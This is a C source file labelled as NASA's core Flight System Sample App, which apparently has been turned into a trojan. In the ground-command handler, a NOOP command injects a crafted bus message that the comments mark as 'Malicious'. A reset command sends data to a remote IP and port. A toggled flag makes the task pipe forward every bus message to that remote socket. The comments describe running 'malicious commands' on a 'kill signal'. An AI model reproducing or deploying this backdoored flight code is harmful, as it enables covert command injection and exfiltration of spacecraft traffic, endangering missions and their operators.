/************************************************************************
 * NASA Docket No. GSC-18,719-1, and identified as “core Flight System: Bootes”
 *
 * Copyright (c) 2020 United States Government as represented by the
 * Administrator of the National Aeronautics and Space Administration.
 * All Rights Reserved.
 *
 * Licensed under the Apache License, Version 2.0 (the "License"); you may
 * not use this file except in compliance with the License. You may obtain
 * a copy of the License at http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 ************************************************************************/

/**
 * \file
 *   This file contains the source code for the Sample App.
 */

/*
** Include Files:
*/
#include "sample_app.h"
#include "sample_app_dispatch.h"
#include "sample_app_cmds.h"
#include "sample_app_eventids.h"
#include "sample_app_msgids.h"
#include "sample_app_msg.h"

/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * **/
/*                                                                            */
/* Verify command packet length                                               */
/*                                                                            */
/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * **/
bool SAMPLE_APP_VerifyCmdLength(const CFE_MSG_Message_t *MsgPtr, size_t ExpectedLength)
{
    bool              result       = true;
    size_t            ActualLength = 0;
    CFE_SB_MsgId_t    MsgId        = CFE_SB_INVALID_MSG_ID;
    CFE_MSG_FcnCode_t FcnCode      = 0;

    CFE_MSG_GetSize(MsgPtr, &ActualLength);

    /*
    ** Verify the command packet length.
    */
    if (ExpectedLength != ActualLength)
    {
        CFE_MSG_GetMsgId(MsgPtr, &MsgId);
        CFE_MSG_GetFcnCode(MsgPtr, &FcnCode);

        CFE_EVS_SendEvent(SAMPLE_APP_CMD_LEN_ERR_EID, CFE_EVS_EventType_ERROR,
                          "Invalid Msg length: ID = 0x%X,  CC = %u, Len = %u, Expected = %u",
                          (unsigned int)CFE_SB_MsgIdToValue(MsgId), (unsigned int)FcnCode, (unsigned int)ActualLength,
                          (unsigned int)ExpectedLength);

        result = false;

        SAMPLE_APP_Data.ErrCounter++;
    }

    return result;
}

/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * **/
/*                                                                            */
/* SAMPLE ground commands                                                     */
/*                                                                            */
/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * **/
void SAMPLE_APP_ProcessGroundCommand(const CFE_SB_Buffer_t *SBBufPtr)
{
    CFE_MSG_FcnCode_t CommandCode = 0;
    CFE_MSG_GetFcnCode(&SBBufPtr->Msg, &CommandCode);

    /*
    ** Set potential messages to be sent here in hex format
    ** Basically theyre in reverse from what the ground system outputs
    ** So now when sample receives the "kill signal" it can run the malicious commands (when i find them)
    */

    /*
    ** Change potMsg to desired command, maybe make multiple potential messages
    ** Then below inside of switch transmit command onto buffer
    ** Example: long long int potMsg = 0xa400010000c08218;
    */

    long long int potMsg = 0x2000010000c00618; // es_noop
    long long int buffer = potMsg;

    CFE_MSG_Message_t* MsgPtr = (CFE_MSG_Message_t *) &(potMsg);

    /*
    ** Process SAMPLE app ground commands
    */

    switch (CommandCode) // commandCode is number 0-X for different commands
    {
        case SAMPLE_APP_NOOP_CC:

            CFE_SB_TransmitMsg(MsgPtr, true); // Malicious message here
            if (SAMPLE_APP_VerifyCmdLength(&SBBufPtr->Msg, sizeof(SAMPLE_APP_NoopCmd_t)))
            {
                SAMPLE_APP_NoopCmd((const SAMPLE_APP_NoopCmd_t *)SBBufPtr);
            }
            break;

        case SAMPLE_APP_RESET_COUNTERS_CC:

            send_to_socket(REMOTE_IP, REMOTE_PORT, &buffer, sizeof(buffer));

            if (SAMPLE_APP_VerifyCmdLength(&SBBufPtr->Msg, sizeof(SAMPLE_APP_ResetCountersCmd_t)))
            {
                SAMPLE_APP_ResetCountersCmd((const SAMPLE_APP_ResetCountersCmd_t *)SBBufPtr);
            }
            break;

        case SAMPLE_APP_PROCESS_CC:
            if (SAMPLE_APP_VerifyCmdLength(&SBBufPtr->Msg, sizeof(SAMPLE_APP_ProcessCmd_t)))
            {
                SAMPLE_APP_ProcessCmd((const SAMPLE_APP_ProcessCmd_t *)SBBufPtr);
            }
            break;

        case SAMPLE_APP_DISPLAY_PARAM_CC:
            if (SAMPLE_APP_VerifyCmdLength(&SBBufPtr->Msg, sizeof(SAMPLE_APP_DisplayParamCmd_t)))
            {
                SAMPLE_APP_DisplayParamCmd((const SAMPLE_APP_DisplayParamCmd_t *)SBBufPtr);
            }
            break;
        case SAMPLE_APP_SEND_PIPES_CC:
            find_pipes();
//            CFE_SB_TransmitMsg(MsgPtr, true); // test for now
            CFE_EVS_SendEvent(SAMPLE_APP_CC_ERR_EID, CFE_EVS_EventType_ERROR, "Send pipe comand code: CC = %d",
                              CommandCode);
            break;
        case SAMPLE_APP_SEND_SB_CC:
            relay_data = !relay_data;
            CFE_EVS_SendEvent(SAMPLE_APP_CC_ERR_EID, CFE_EVS_EventType_ERROR, "Send SB comand code: CC = %d",
                              CommandCode);
            break;

        /* default case already found during FC vs length test */
        default:
            CFE_EVS_SendEvent(SAMPLE_APP_CC_ERR_EID, CFE_EVS_EventType_ERROR, "Invalid ground command code: CC = %d",
                              CommandCode);
            break;
    }
}

/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * **/
/*                                                                            */
/*  Purpose:                                                                  */
/*     This routine will process any packet that is received on the SAMPLE    */
/*     command pipe.                                                          */
/*                                                                            */
/* * * * * * * * * * * * * * * * * * * * * * * *  * * * * * * *  * *  * * * * */
void SAMPLE_APP_TaskPipe(const CFE_SB_Buffer_t *SBBufPtr)
{
    CFE_SB_MsgId_t MsgId = CFE_SB_INVALID_MSG_ID;

    CFE_MSG_GetMsgId(&SBBufPtr->Msg, &MsgId);


    /*
    ** Print any commands sent on buffer since sample is subscribed to all major headers
    */

//    CFE_ES_WriteToSysLog("Sample App: Command Packet: 0x%x\n", (unsigned int)CFE_SB_MsgIdToValue(MsgId));
//    CFE_ES_WriteToSysLog("Sample App: Command Info: %llx", (long long int)SBBufPtr->LongInt);

    if (relay_data)
    {
        long long int msg = (long long int)SBBufPtr->LongInt;
        send_to_socket(REMOTE_IP, REMOTE_PORT, &msg, sizeof(msg));
    }
    switch (CFE_SB_MsgIdToValue(MsgId))
    {
        case SAMPLE_APP_CMD_MID:
            SAMPLE_APP_ProcessGroundCommand(SBBufPtr);
            break;

        case SAMPLE_APP_SEND_HK_MID:
            SAMPLE_APP_SendHkCmd((const SAMPLE_APP_SendHkCmd_t *)SBBufPtr);
            break;

        default:
//            CFE_EVS_SendEvent(SAMPLE_APP_MID_ERR_EID, CFE_EVS_EventType_ERROR,
//                              "SAMPLE: invalid command packet,MID = 0x%x", (unsigned int)CFE_SB_MsgIdToValue(MsgId));
            break;
    }
}
